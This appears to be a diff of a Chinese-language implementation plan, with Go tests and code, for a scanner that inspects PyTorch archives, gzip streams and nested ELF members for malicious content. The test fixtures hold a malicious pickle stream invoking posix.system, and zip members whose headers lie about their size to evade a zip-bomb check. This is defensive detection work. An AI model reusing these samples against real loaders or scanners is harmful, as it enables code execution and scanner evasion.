+	elfMember := elfFixtureBytes(t, elfSpec{imports: []string{"connect"}, needed: []string{"libc.so.6"}})
+	path := writeTestBytes(t, dir, "model.pt", zipFixture(t, map[string][]byte{"lib.so": elfMember}, []string{"lib.so"}))
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxArchiveMemberBytes = int64(len(elfMember))
+	set := newTestEvidence(path, KindArchive)
+	if err := collectArchive(path, set, cfg); err != nil {
+		t.Fatalf("collectArchive: %v", err)
+	}
+	if !set.Bound.Structural {
+		t.Fatalf("Bound.Structural = false for a member at the byte budget; its tail was never read")
+	}
+	if !strings.Contains(set.Bound.Reason, "lib.so") {
+		t.Errorf("bound reason = %q, want it to name the member lib.so", set.Bound.Reason)
+	}
+	if !strings.Contains(set.Bound.Reason, "byte budget") {
+		t.Errorf("bound reason = %q, want it to name the byte budget", set.Bound.Reason)
+	}
+}
+
+// TestCollectArchiveEvidenceReturnsAnErrorForAnUnopenableContainer pins the other
+// half of the fail-closed split, and the reason it is not folded into the
+// member-ceiling test is that the two look identical if a guard is written the
+// easy way. A container that will not open is a file the scan never looked at, so
+// collectArchive returns an error; only a container it opened and did not finish
+// gets Bound.Structural. Swallowing the open error into markStructural would make
+// an unreadable file indistinguishable from a read one - the scanner counts set.Err
+// as Incomplete and withholds the pass, and a bound alone does not carry that.
+func TestCollectArchiveEvidenceReturnsAnErrorForAnUnopenableContainer(t *testing.T) {
+	dir := t.TempDir()
+	// Zip magic, then bytes with no central directory behind them, so the magic
+	// classifies it as a container and zip.NewReader refuses it.
+	raw := append([]byte("PK\x03\x04"), bytes.Repeat([]byte{0xff}, 64)...)
+	path := writeTestBytes(t, dir, "broken.pt", raw)
+
+	set := newTestEvidence(path, KindArchive)
+	err := collectArchive(path, set, DefaultBinaryConfig())
+	if err == nil {
+		t.Fatal("collectArchive accepted a file with zip magic that will not open; a failed look must not be reported as a bounded one")
+	}
+	if set.Bound.Structural {
+		t.Errorf("an unopenable container set Bound.Structural (%q); the failure must be an error, not a bound", set.Bound.Reason)
+	}
+}
+
+// TestCollectCompressedEvidence pins both directions of the gzip gate. The
+// decompressed bytes are a file of their own, so the pickle interpreter runs on
+// them only if they sniff as a pickle: a pickle hidden in a .gz is read as one,
+// and a gzip that is not a pickle gets the strings pass alone rather than a
+// structural bound on KindCompressed - which is executable, so a bound there
+// would block every .gz in every package.
 func TestCollectCompressedEvidence(t *testing.T) {
 	dir := t.TempDir()
-	var buf bytes.Buffer
-	zw := gzip.NewWriter(&buf)
-	if _, err := zw.Write([]byte("\x80\x04cposix\nsystem\n.PADDING_PADDING")); err != nil {
-		t.Fatal(err)
+	gz := func(name, content string) string {
+		var buf bytes.Buffer
+		zw := gzip.NewWriter(&buf)
+		if _, err := zw.Write([]byte(content)); err != nil {
+			t.Fatal(err)
+		}
+		if err := zw.Close(); err != nil {
+			t.Fatal(err)
+		}
+		return writeTestBytes(t, dir, name, buf.Bytes())
 	}
-	if err := zw.Close(); err != nil {
-		t.Fatal(err)
-	}
-	path := writeTestBytes(t, dir, "payload.gz", buf.Bytes())
 
-	set := newTestEvidence(path, KindCompressed)
-	if err := collectCompressed(path, set, DefaultBinaryConfig()); err != nil {
+	picklePath := gz("payload.gz", "\x80\x04cposix\nsystem\n.PADDING_PADDING")
+	set := newTestEvidence(picklePath, KindCompressed)
+	if err := collectCompressed(picklePath, set, DefaultBinaryConfig()); err != nil {
 		t.Fatalf("collectCompressed: %v", err)
 	}
 	var pickles []string
@@ -2129,12 +5201,279 @@ func TestCollectCompressedEvidence(t *testing.T) {
 	if !containsString(pickles, "posix.system") {
 		t.Errorf("pickle evidence = %v, want [posix.system]", pickles)
 	}
+
+	// A gzip of bytes that are not a pickle must not produce pickle evidence and
+	// must not be bounded: the interpreter never ran.
+	textPath := gz("notes.gz", "the posix system call interface is described here")
+	set = newTestEvidence(textPath, KindCompressed)
+	if err := collectCompressed(textPath, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectCompressed: %v", err)
+	}
+	for _, l := range set.Lines {
+		if l.Source == SourcePickle {
+			t.Errorf("pickle evidence %q from a gzip that is not a pickle", l.Text)
+		}
+	}
+	if set.Bound.Structural {
+		t.Errorf("a gzip that is not a pickle set Bound.Structural: %s", set.Bound.Reason)
+	}
+}
+
+// lyingMember builds a one-member zip whose header declares a size that does not
+// match the bytes it stores. zip.Writer.Create writes the true sizes, so a fixture
+// that has to lie needs CreateRaw and the header fields set by hand.
+//
+// It exists because a member whose declared size exceeds a budget is caught by
+// collectArchive's declared-size check before it is ever opened, so the inner
+// per-member budgets are reachable only by a member that lies - and the reader
+// bounds what it hands out: checksumReader returns ErrFormat the moment it reads
+// past the declared UncompressedSize64, so a member can never deliver more than
+// its declared size. The only lie that both bypasses the declared-size check and
+// delivers bytes is the high bit set, which makes int64(UncompressedSize64)
+// negative and the "> budget" comparison false.
+func lyingMember(t *testing.T, name string, body []byte, method uint16, declared uint64) []byte {
+	t.Helper()
+	var buf bytes.Buffer
+	zw := zip.NewWriter(&buf)
+	fh := &zip.FileHeader{Name: name, Method: method}
+	fh.UncompressedSize64 = declared
+	fh.CompressedSize64 = uint64(len(body))
+	fh.CRC32 = crc32.ChecksumIEEE(body)
+	w, err := zw.CreateRaw(fh)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := w.Write(body); err != nil {
+		t.Fatal(err)
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return buf.Bytes()
+}
+
+// TestCollectCompressedEvidenceBoundsTheDecompressedBudget pins the budget on the
+// decompressed bytes of a gzip. It is the most serious of the container budgets:
+// it is the only thing between a small .gz and an unbounded decompression scan,
+// and reaching it needs no crafted input, only ordinary compressible data.
+//
+// A small cfg reaches the same branch as a stream above the default 256 MiB - the
+// guard reads cfg.MaxArchiveMemberBytes - so the fixture is 512 bytes, not a
+// quarter of a gigabyte. The bytes are not a pickle, so the interpreter does not
+// run and the bound asserted is the budget's rather than the interpreter's.
+func TestCollectCompressedEvidenceBoundsTheDecompressedBudget(t *testing.T) {
+	dir := t.TempDir()
+	var buf bytes.Buffer
+	zw := gzip.NewWriter(&buf)
+	if _, err := zw.Write(bytes.Repeat([]byte("A"), 512)); err != nil {
+		t.Fatal(err)
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	path := writeTestBytes(t, dir, "big.gz", buf.Bytes())
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxArchiveMemberBytes = 64
+	set := newTestEvidence(path, KindCompressed)
+	if err := collectCompressed(path, set, cfg); err != nil {
+		t.Fatalf("collectCompressed: %v", err)
+	}
+	if !set.Bound.Structural {
+		t.Fatalf("Bound.Structural = false for a .gz past the decompressed budget; the scan was not bounded")
+	}
+	if want := "decompressed stream exceeds 64 bytes"; !strings.Contains(set.Bound.Reason, want) {
+		t.Errorf("bound reason = %q, want it to name %q", set.Bound.Reason, want)
+	}
+}
+
+// TestCollectArchiveEvidenceBoundsAPickleMemberAtTheByteBudget pins the pass-through
+// from collectPickleMember to streamReaderEvidence. The bound it can set - "member
+// %s exceeds the byte budget" - is unreachable for an honest member: the declared
+// size that would exceed the budget is caught first by collectArchive's
+// declared-size check, so the member is never opened, and an honest member never
+// delivers more than its declared size. Reaching this budget is therefore only
+// possible through lyingMember's high-bit lie, which is why the fixture lies.
+//
+// A small cfg reaches the same branch as a member above the default budget, and
+// the pickle body stops at STOP well inside the budget, so the interpreter records
+// only a trailing-bytes notice and the budget is the first structural reason.
+func TestCollectArchiveEvidenceBoundsAPickleMemberAtTheByteBudget(t *testing.T) {
+	dir := t.TempDir()
+	// PROTO, GLOBAL(posix.system), STOP, then padding after STOP that the
+	// interpreter counts but does not parse.
+	body := append([]byte("\x80\x04cposix\nsystem\n."), bytes.Repeat([]byte(" "), 400)...)
+	path := writeTestBytes(t, dir, "model.pt", lyingMember(t, "payload.pkl", body, zip.Store, 1<<63))
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxArchiveMemberBytes = 64
+	set := newTestEvidence(path, KindArchive)
+	if err := collectArchive(path, set, cfg); err != nil {
+		t.Fatalf("collectArchive: %v", err)
+	}
+	if !set.Bound.Structural {
+		t.Fatalf("Bound.Structural = false for a pickle member past the byte budget")
+	}
+	if !strings.Contains(set.Bound.Reason, "payload.pkl") {
+		t.Errorf("bound reason = %q, want it to name the member", set.Bound.Reason)
+	}
+	if !strings.Contains(set.Bound.Reason, "exceeds the byte budget") {
+		t.Errorf("bound reason = %q, want the pickle member byte-budget wording", set.Bound.Reason)
+	}
+}
+
+// TestCollectArchiveEvidenceBoundsAMemberByItsDeclaredSize pins the declared-size
+// check, the one that fires before a member is opened and is therefore the real
+// zip-bomb guard: a small archive can declare a member far larger than the whole
+// archive, and trusting the declaration is what the check refuses to do.
+//
+// Two cases. Declared comfortably above the budget is caught by the check itself.
+// Declared with the high bit set makes int64(UncompressedSize64) negative, so the
+// "> budget" comparison is false and the check is bypassed - and then it is the
+// inner per-member budget, not this one, that bounds the member. That second case
+// is what makes the inner budgets load-bearing rather than redundant, so it is
+// pinned here over an ELF member (the pickle-side inner budget is pinned by
+// TestCollectArchiveEvidenceBoundsAPickleMemberAtTheByteBudget).
+func TestCollectArchiveEvidenceBoundsAMemberByItsDeclaredSize(t *testing.T) {
+	dir := t.TempDir()
+	cfg := DefaultBinaryConfig()
+	cfg.MaxArchiveMemberBytes = 64
+
+	t.Run("above the budget", func(t *testing.T) {
+		body := append([]byte("\x80\x04cposix\nsystem\n."), bytes.Repeat([]byte(" "), 400)...)
+		path := writeTestBytes(t, dir, "bomb.pt", lyingMember(t, "big.pkl", body, zip.Store, 1<<20))
+
+		set := newTestEvidence(path, KindArchive)
+		if err := collectArchive(path, set, cfg); err != nil {
+			t.Fatalf("collectArchive: %v", err)
+		}
+		if !set.Bound.Structural {
+			t.Fatalf("Bound.Structural = false for a member declaring a size above the budget")
+		}
+		if want := "member byte budget 64 reached at big.pkl"; !strings.Contains(set.Bound.Reason, want) {
+			t.Errorf("bound reason = %q, want it to name %q", set.Bound.Reason, want)
+		}
+	})
+
+	t.Run("high bit set", func(t *testing.T) {
+		body := elfFixtureBytes(t, elfSpec{imports: []string{"connect"}})
+		path := writeTestBytes(t, dir, "bomb2.pt", lyingMember(t, "lib.so", body, zip.Store, 1<<63))
+
+		set := newTestEvidence(path, KindArchive)
+		if err := collectArchive(path, set, cfg); err != nil {
+			t.Fatalf("collectArchive: %v", err)
+		}
+		if !set.Bound.Structural {
+			t.Fatalf("Bound.Structural = false for a high-bit declared member; the inner budget did not bound it")
+		}
+		if !strings.Contains(set.Bound.Reason, "lib.so") {
+			t.Errorf("bound reason = %q, want it to name the member", set.Bound.Reason)
+		}
+		if !strings.Contains(set.Bound.Reason, "truncated at the byte budget") {
+			t.Errorf("bound reason = %q, want the ELF member byte-budget wording", set.Bound.Reason)
+		}
+	})
+}
+
+// gzipOfZeros writes a gzip stream whose decompressed content is n zero bytes,
+// streaming the input so the fixture stays small even when n is hundreds of
+// megabytes. Zero bytes are used because they are neither a pickle nor a string,
+// so the only bound a scan of them can record is the byte budget's.
+func gzipOfZeros(t *testing.T, dir, name string, n int) string {
+	t.Helper()
+	var buf bytes.Buffer
+	zw, err := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
+	if err != nil {
+		t.Fatal(err)
+	}
+	block := make([]byte, 1<<20)
+	for written := 0; written < n; {
+		chunk := len(block)
+		if remaining := n - written; remaining < chunk {
+			chunk = remaining
+		}
+		if _, err := zw.Write(block[:chunk]); err != nil {
+			t.Fatal(err)
+		}
+		written += chunk
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return writeTestBytes(t, dir, name, buf.Bytes())
+}
+
+// TestCollectCompressedEvidenceNormalizesAZeroConfig pins that collectCompressed
+// resolves a zero BinaryConfig to the defaults, as collectELF does. It is the
+// collector where the asymmetry is a defect and not just a wart: streamReaderEvidence
+// reads a budget of zero as "unlimited", so an unresolved zero disables the
+// decompression bound entirely - fail-open in the one direction this design
+// refuses, in contrast to the fail-closed-but-wrong a zero produces elsewhere.
+//
+// The mirror is Task 5's TestCollectELFEvidenceNormalizesAZeroConfig. Its shape is
+// forced by the asymmetry itself: the two configs differ only on a stream past the
+// DEFAULT budget, so the fixture inflates to DefaultBinaryConfig().MaxArchiveMemberBytes+1
+// zero bytes and the zero config must bound it exactly as the default does.
+func TestCollectCompressedEvidenceNormalizesAZeroConfig(t *testing.T) {
+	dir := t.TempDir()
+	budget := DefaultBinaryConfig().MaxArchiveMemberBytes
+	path := gzipOfZeros(t, dir, "huge.gz", int(budget)+1)
+
+	zero := newTestEvidence(path, KindCompressed)
+	if err := collectCompressed(path, zero, BinaryConfig{}); err != nil {
+		t.Fatalf("collectCompressed with a zero config: %v", err)
+	}
+	if !zero.Bound.Structural {
+		t.Fatalf("a zero config left a %d-byte decompressed stream unbounded; the zero value must mean the default budget, not no budget", budget+1)
+	}
+	if want := fmt.Sprintf("decompressed stream exceeds %d bytes", budget); !strings.Contains(zero.Bound.Reason, want) {
+		t.Errorf("bound reason = %q, want it to name the default budget %d", zero.Bound.Reason, budget)
+	}
+
+	def := newTestEvidence(path, KindCompressed)
+	if err := collectCompressed(path, def, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectCompressed with the default config: %v", err)
+	}
+	if zero.Bound != def.Bound {
+		t.Errorf("zero config bound = %+v, default config bound = %+v; they must agree", zero.Bound, def.Bound)
+	}
+}
+
+// TestCollectArchiveEvidenceNormalizesAZeroConfig pins that collectArchive resolves
+// a zero BinaryConfig to the defaults. It is not the fail-open case - a zero
+// MaxArchiveMembers reads as "no member allowed" and bounds the first member, which
+// is fail-closed - but it is the same asymmetry, and without it a caller that set
+// one field would silently bound every archive.
+func TestCollectArchiveEvidenceNormalizesAZeroConfig(t *testing.T) {
+	dir := t.TempDir()
+	raw := zipFixture(t, map[string][]byte{"data.pkl": []byte("\x80\x04cposix\nsystem\n.")}, []string{"data.pkl"})
+	path := writeTestBytes(t, dir, "model.pt", raw)
+
+	zero := newTestEvidence(path, KindArchive)
+	if err := collectArchive(path, zero, BinaryConfig{}); err != nil {
+		t.Fatalf("collectArchive with a zero config: %v", err)
+	}
+	def := newTestEvidence(path, KindArchive)
+	if err := collectArchive(path, def, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectArchive with the default config: %v", err)
+	}
+	if zero.Bound.Structural {
+		t.Errorf("a zero config produced a structural bound %+v; the zero value must mean the defaults", zero.Bound)
+	}
+	if zero.Bound != def.Bound {
+		t.Errorf("zero config bound = %+v, default config bound = %+v; they must agree", zero.Bound, def.Bound)
+	}
+	if len(zero.Lines) != len(def.Lines) {
+		t.Errorf("zero config produced %d evidence lines, default config produced %d", len(zero.Lines), len(def.Lines))
+	}
 }
 ```
 
-文件顶部 import 块补 `"archive/zip"`、`"compress/gzip"`、`"fmt"`。
+文件顶部 import 块补 `"archive/zip"`、`"compress/gzip"`、`"hash/crc32"`（`lyingMember` 要重算被改写头部的 CRC——`ChecksumIEEE`，因为 `CreateRaw` 不做这件事，写错的 CRC 会让 `zip.Reader` 在读到成员时直接报错，夹具就测不到它想测的那个预算）。`"fmt"` 已在 Step 2 引入。
 
-- [ ] **Step 2: 跑测试确认失败**
+> **`TestCollectCompressedEvidenceNormalizesAZeroConfig` 的两点记录，都不改代码。** 其一，夹具必须膨胀到 `DefaultBinaryConfig().MaxArchiveMemberBytes+1`（256 MiB + 1）个字节，这个形状是被归一化的不对称本身逼出来的：两个配置只在"流越过**默认**预算"时才有分歧，所以夹具必须越过默认预算，用小 `cfg` 测不到归一化。**代价是解压 CPU，不是 256 MiB 内存**——实测约 1.37 s、约 0.1 MiB 分配、磁盘上 325 KB 的 `.gz`；`gzipOfZeros` 分块流式写入就是为了这一点。其二，它的第二段（`def` 臂：再用 `DefaultBinaryConfig()` 跑一遍并断言两个 `Bound` 相等）是**冗余**的，第一段已经从默认预算算出期望值并断言过了。评审建议删掉这一段；这里记录在案、留给最终评审，代码维持已交付的样子。
+
+- [ ] **Step 5: 跑测试确认失败**
 
 ```bash
 go test ./internal/codeaudit/ -run 'TestCollectArchive|TestCollectCompressed' 2>&1 | head -10
@@ -2142,9 +5481,9 @@ go test ./internal/codeaudit/ -run 'TestCollectArchive|TestCollectCompressed' 2>
 
 预期：编译失败，`undefined: collectArchive`。
 
-- [ ] **Step 3: 实现**
+- [ ] **Step 6: 实现**
 
-追加到 `binary_evidence.go`（import 块补 `"archive/zip"`、`"compress/gzip"`）：
+追加到 `binary_evidence.go`（import 块补 `"archive/zip"`、`"bufio"`、`"compress/gzip"`；`isPickleStream` 由 Task 1 提供，这里直接用）：
 
 ```go
 // collectArchive reads a zip-based container: PyTorch .pt, wheels, .npz, jars.
@@ -2154,13 +5493,22 @@ go test ./internal/codeaudit/ -run 'TestCollectArchive|TestCollectCompressed' 2>
 // stream, and a package can ship a shared object the same way. Every member is
 // sniffed, and the ones that sniff as ELF or pickle are read with the same
 // extractors used for a standalone file - one level deep, because a container
-// inside a container is a nesting depth this version does not follow and says so
-// through the bound.
+// inside a container is a nesting depth this version does not follow.
+//
+// A member that sniffs as an archive is skipped, and the skip is silent: it stays
+// visible as a member line but does not set Bound. That is deliberate and its cost
+// is named in the plan's boundary section (a checkpoint shipped only inside a zip
+// never reaches its data.pkl), so it is not a hole to be plugged here by
+// recursing, which would need its own depth and budget model.
 //
 // The decompressed-byte budget is shared across the archive rather than applied
 // per member: a zip bomb is many small members, not one large one, so a per-member
 // limit is a limit that does not bind.
 func collectArchive(path string, set *EvidenceSet, cfg BinaryConfig) error {
+	// Resolve a zero config to the defaults, as the other collectors do. A zero
+	// MaxArchiveMembers would read as "no member is allowed" and bound every
+	// archive on its first member - wrong, and fail-closed, but wrong.
+	cfg = normalizeBinaryConfig(cfg)
 	f, err := os.Open(path)
 	if err != nil {
 		return fmt.Errorf("open %s: %w", path, err)
@@ -2174,7 +5522,12 @@ func collectArchive(path string, set *EvidenceSet, cfg BinaryConfig) error {
 	zr, err := zip.NewReader(f, info.Size())
 	if err != nil {
 		// A file with zip magic that will not open is a container this scan did
-		// not look inside.
+		// not look inside - a failed look, not a bounded one, so the error is
+		// returned rather than marked structural. That distinction is load-bearing
+		// downstream: CollectEvidence records it as set.Err, and the scanner counts
+		// set.Err as Incomplete rather than passing the file off as examined. A
+		// markStructural here would have said "read, with a gap" about a file that
+		// was never read at all.
 		return fmt.Errorf("open archive %s: %w", path, err)
 	}
 
@@ -2264,17 +5617,22 @@ func collectELFMember(set *EvidenceSet, member *zip.File, cfg BinaryConfig) erro
 		set.markStructural(fmt.Sprintf("member %s truncated at the byte budget", member.Name))
 	}
 
-	// The strings and pickle passes run over the member as well as the structural
-	// parse below. Without this, an ELF nested in a .whl would be the one
-	// executable format in the channel read without a strings pass - its sibling
-	// member kinds already get one - and a nested ELF is precisely where a stapled
+	// The strings pass runs over the member as well as the structural parse
+	// below. Without this, an ELF nested in a .whl would be the one executable
+	// format in the channel read without a strings pass - its sibling member
+	// kinds already get one - and a nested ELF is precisely where a stapled
 	// payload would be put. The bytes are already in memory, so the pass is a scan
 	// over a slice rather than a second read.
+	//
+	// pickleScan is false, and it must stay false: this member was classified as
+	// an ELF, and the interpreter commits to a parse, so running it here would set
+	// Bound.Structural on an executable kind and block the import of every wheel
+	// that ships a shared object.
 	//
 	// A zero budget means unlimited here: the read that filled data was the
 	// bounded one, and bounding the scan of an already-bounded slice would only
 	// lose the tail of it.
-	if err := streamReaderEvidence(bytes.NewReader(data), set, cfg, 0, ""); err != nil {
+	if err := streamReaderEvidence(bytes.NewReader(data), set, cfg, 0, "", false); err != nil {
 		return err
 	}
 
@@ -2285,30 +5643,47 @@ func collectELFMember(set *EvidenceSet, member *zip.File, cfg BinaryConfig) erro
 	return collectELFReader(bytes.NewReader(data), set, cfg, member.Name)
 }
 
-// streamReaderEvidence runs both byte extractors over a stream, stopping after
+// streamReaderEvidence runs the byte extractors over a stream, stopping after
 // budget bytes and recording the cut as a structural bound. A budget of zero or
-// less means the stream is read to the end.
+// less means the stream is read to the end. The strings pass always runs; the
+// pickle interpreter runs only when pickleScan is true.
 //
-// It exists because four call sites need exactly this loop - a pickle member, an
-// ELF member, a decompressed gzip stream, and a whole file - and the bound has to
-// be enforced identically in all of them. The reason is not brevity. The bound is
+// It exists because three call sites need exactly this loop - a pickle member, an
+// ELF member, and a decompressed gzip stream - and the bound has to be enforced
+// identically in all of them. A whole file does not use this loop: it goes through
+// streamEvidence, which is a separate implementation over the same rule, and
+// unifying the two is deliberately left out of this change rather than taken on.
+// The reason is not brevity. The bound is
 // what sets Bound.Structural, Bound.Structural is what withholds a clean verdict
 // from a stream whose tail was never read, and a call site that enforced it
 // slightly differently would be a hole in the fail-closed rule rather than a
 // style difference.
 //
+// pickleScan is a parameter rather than a read of set.Kind because a member's
+// kind is the member's, not the set's: the set is the archive, and every member
+// of an archive would otherwise be judged by the archive's kind. The caller
+// already classified the member to decide to read it, so it is the caller that
+// knows whether this stream is a claimed pickle. The gate exists because the
+// interpreter commits to a parse: a byte it cannot classify as an opcode ends the
+// parse with a structural bound, and a structural bound on an executable kind
+// blocks the import - so an interpreter run over anything but a claimed pickle is
+// a bound on a file that is not malformed at all.
+//
 // The budget is applied inside the read rather than between reads, for the same
-// reason it is in streamEvidence: checking at the top of the loop lets one 64 KiB
-// read walk past a much smaller budget. When the budget is spent, one probe byte
-// decides whether it actually cut anything - a stream that ends exactly at the
-// budget was read completely, and marking it bounded would fail a clean scan for
-// no reason.
+// reason it is in streamEvidence: checking it at the top of the loop lets one 64
+// KiB read walk past a much smaller budget. When the budget is spent, one probe
+// byte decides whether it actually cut anything - a stream that ends exactly at
+// the budget was read completely, and marking it bounded would fail a clean scan
+// for no reason.
 //
 // bounded is the caller's wording for the cut, because the four sites name
 // different budgets in their reasons.
-func streamReaderEvidence(rc io.Reader, set *EvidenceSet, cfg BinaryConfig, budget int64, bounded string) error {
+func streamReaderEvidence(rc io.Reader, set *EvidenceSet, cfg BinaryConfig, budget int64, bounded string, pickleScan bool) error {
 	scanner := newStringScanner(set, cfg)
-	pickles := newPickleScanner(set)
+	var pickles *pickleScanner
+	if pickleScan {
+		pickles = newPickleScanner(set)
+	}
 
 	var read int64
 	buf := make([]byte, evidenceReadChunk)
@@ -2329,8 +5704,10 @@ func streamReaderEvidence(rc io.Reader, set *EvidenceSet, cfg BinaryConfig, budg
 			if _, err := scanner.Write(buf[:n]); err != nil {
 				return err
 			}
-			if _, err := pickles.Write(buf[:n]); err != nil {
-				return err
+			if pickles != nil {
+				if _, err := pickles.Write(buf[:n]); err != nil {
+					return err
+				}
 			}
 			read += int64(n)
 		}
@@ -2342,12 +5719,17 @@ func streamReaderEvidence(rc io.Reader, set *EvidenceSet, cfg BinaryConfig, budg
 		}
 	}
 	scanner.Flush()
-	pickles.Flush()
+	if pickles != nil {
+		pickles.Flush()
+	}
 	return nil
 }
 
-// collectPickleMember runs the byte extractors over a container member, tagged
-// so a reader can tell a member's evidence from the archive's own.
+// collectPickleMember runs the byte extractors over a pickle container member.
+//
+// pickleScan is true because the dispatcher classified this member as KindPickle
+// before calling, and a claimed pickle is exactly the stream the interpreter is
+// allowed to commit to.
 func collectPickleMember(set *EvidenceSet, member *zip.File, cfg BinaryConfig) error {
 	rc, err := member.Open()
 	if err != nil {
@@ -2356,7 +5738,7 @@ func collectPickleMember(set *EvidenceSet, member *zip.File, cfg BinaryConfig) e
 	defer rc.Close()
 
 	return streamReaderEvidence(rc, set, cfg, cfg.MaxArchiveMemberBytes,
-		fmt.Sprintf("member %s exceeds the byte budget", member.Name))
+		fmt.Sprintf("member %s exceeds the byte budget", member.Name), true)
 }
 
 // collectCompressed reads a single-stream compressed file. Only the formats the
@@ -2365,6 +5747,13 @@ func collectPickleMember(set *EvidenceSet, member *zip.File, cfg BinaryConfig) e
 // decompressor written for this purpose would be a new parser on the import
 // path with no evidence behind it.
 func collectCompressed(path string, set *EvidenceSet, cfg BinaryConfig) error {
+	// Resolve a zero config to the defaults, and this is the collector where it
+	// matters most: streamReaderEvidence reads a budget of zero as "unlimited", so
+	// an unresolved zero here would silently disable the decompression bound - the
+	// one guard between a small .gz and an unbounded scan. That is fail-open in the
+	// single direction this design refuses, rather than the merely-wrong fail-closed
+	// a zero config produces elsewhere.
+	cfg = normalizeBinaryConfig(cfg)
 	f, err := os.Open(path)
 	if err != nil {
 		return fmt.Errorf("open %s: %w", path, err)
@@ -2379,63 +5768,35 @@ func collectCompressed(path string, set *EvidenceSet, cfg BinaryConfig) error {
 	}
 	defer zr.Close()
 
+	// The decompressed bytes are a second file with their own kind, and they are
+	// the one place the pickle gate has to be decided by sniffing rather than by a
+	// classification the caller already made. It matters that it is decided at
+	// all: a gzip of a tar is the common case (models/audit/holdout-sources/sr.tgz
+	// is one), its bytes are not an opcode stream, and running the interpreter over
+	// them would set a structural bound on KindCompressed - which is executable -
+	// and block the import of every .gz that is not itself a pickle.
+	//
+	// A buffered reader peeks the head and then hands the same bytes on, so the
+	// sniff reads nothing twice and costs no second pass. The path argument to
+	// isPickleStream is empty on purpose: the extension belongs to the compressed
+	// file, not to what it expands to.
+	br := bufio.NewReaderSize(zr, sniffBytes)
+	head, _ := br.Peek(sniffBytes)
+	pickleScan := isPickleStream(head, "")
+
 	// The decompressed length is attacker-controlled, so the budget is what keeps
 	// a small .gz from expanding into an unbounded scan - the same guard the
 	// archive path uses, and enforced through the same helper so the two cannot
 	// drift.
-	if err := streamReaderEvidence(zr, set, cfg, cfg.MaxArchiveMemberBytes,
-		fmt.Sprintf("decompressed stream exceeds %d bytes", cfg.MaxArchiveMemberBytes)); err != nil {
+	if err := streamReaderEvidence(br, set, cfg, cfg.MaxArchiveMemberBytes,
+		fmt.Sprintf("decompressed stream exceeds %d bytes", cfg.MaxArchiveMemberBytes), pickleScan); err != nil {
 		return fmt.Errorf("read gzip %s: %w", path, err)
 	}
 	return nil
 }
 ```
 
-- [ ] **Step 4: 把 `collectELF` 拆出 reader 版本**
-
-`collectELF(path, ...)` 与 `collectELFMember` 需要共用同一段解析逻辑，所以把 Task 5 的实现体抽到一个以 `io.ReaderAt` 为入口的内核上，`collectELF` 变成薄封装。修改 `binary_evidence.go` 中 Task 5 写的 `collectELF`：
-
-```go
-// collectELF reads a file's ELF structure into evidence.
-func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
-	f, err := os.Open(path)
-	if err != nil {
-		return fmt.Errorf("open %s: %w", path, err)
-	}
-	defer f.Close()
-	// The stream pass and the structural pass are separate on purpose: the
-	// stream pass reads the file front to back for literals, and the structural
-	// pass seeks. Sharing one handle between them would make the structural
-	// parse depend on where the stream pass happened to stop.
-	//
-	// Through streamWithSizeSwitch rather than streamEvidence directly, so that a
-	// large shared object is windowed at its ends like any other large blob
-	// instead of being streamed whole.
-	if err := streamWithSizeSwitch(path, set, cfg); err != nil {
-		return err
-	}
-	return collectELFReader(f, set, cfg, path)
-}
-
-// collectELFReader is the ELF parse itself, over any random-access reader. It is
-// separate from collectELF so that a container member - which is a stream, not a
-// path - is parsed by the same code rather than by a second implementation that
-// would drift from this one.
-//
-// There is no size parameter: the parse bounds itself per section through
-// readBoundedSection, and a size the body never read would be a parameter that
-// only invites the assumption that something is bounds-checked elsewhere.
-func collectELFReader(r io.ReaderAt, set *EvidenceSet, cfg BinaryConfig, name string) error {
-	ef, err := elf.NewFile(r)
-	if err != nil {
-		return fmt.Errorf("parse elf %s: %w", name, err)
-	}
-	defer ef.Close()
-	// ... (Task 5 的解析体原样搬到这里，把 path 换成 name)
-}
-```
-
-- [ ] **Step 5: 跑测试确认通过**
+- [ ] **Step 7: 跑测试确认通过**
 
 ```bash
 go test ./internal/codeaudit/ -run 'TestCollect|TestELF|TestPickle|TestString|TestStream|TestShannon|TestEntropy|TestClassify' -v
@@ -2443,13 +5804,19 @@ go test ./internal/codeaudit/ -run 'TestCollect|TestELF|TestPickle|TestString|Te
 
 预期全 PASS。
 
-- [ ] **Step 6: 提交**
+本步多了一条以前没有的判据：Task 5 的 ELF 用例现在**经过** `streamWithSizeSwitch` 才进入结构解析（Step 3 把 `collectELF` 改成了先 `streamWithSizeSwitch` 再 `collectELFReader`）。它们用的是 `DefaultBinaryConfig()`，`MaxFullScanBytes` 是 64 MiB，而夹具都是几百字节，所以开关判定的都是"整份读"，这些用例必须**原样全绿**——它们变红就说明 Step 3 的接线把默认路径改坏了。这条不变绿是 Step 3 唯一的集成证据：把整份读取换成开窗的回归不会只在这一个用例里露头，而会在 Task 5 的一整族用例上同时露头。
+
+- [ ] **Step 8: 提交**
 
 ```bash
 gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
 git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go
 git commit -m "feat(audit): read zip and gzip containers, recursing into member evidence"
 ```
+
